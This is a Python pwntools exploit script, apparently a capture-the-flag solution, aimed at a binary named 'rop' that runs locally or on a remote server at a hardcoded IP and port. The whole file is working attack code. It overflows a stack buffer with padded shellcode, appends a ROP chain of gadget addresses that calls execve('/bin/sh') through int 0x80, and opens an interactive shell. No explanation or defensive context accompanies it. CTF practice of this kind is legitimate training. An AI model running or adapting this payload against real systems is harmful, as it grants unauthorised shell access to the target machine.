from pwn import *
debug = True
#context.log_level = "debug"
sysbinsh = 0x0804863A
if debug:
	io = process("./rop")
else:
	io = remote("47.75.182.113", 9999)

shellcode = asm(shellcraft.sh())
esp_addr = 0xffffd190
char_addr = esp_addr + 0x1C
ebp_addr = 0xffffd218
char_num = ebp_addr-char_addr
popeax = 0x080bb196
popedxecxebx = 0x0806eb90
binsh = 0x080be408
int0x80 = 0x08049421
print shellcode.ljust(char_num, 'A')
payload = ""
payload += shellcode.ljust(char_num, 'A')
payload += "junk"
ropsyscal = flat([popeax,0xb,popedxecxebx,0,0,binsh,int0x80])
payload += ropsyscal
io.sendline(payload)
io.interactive()



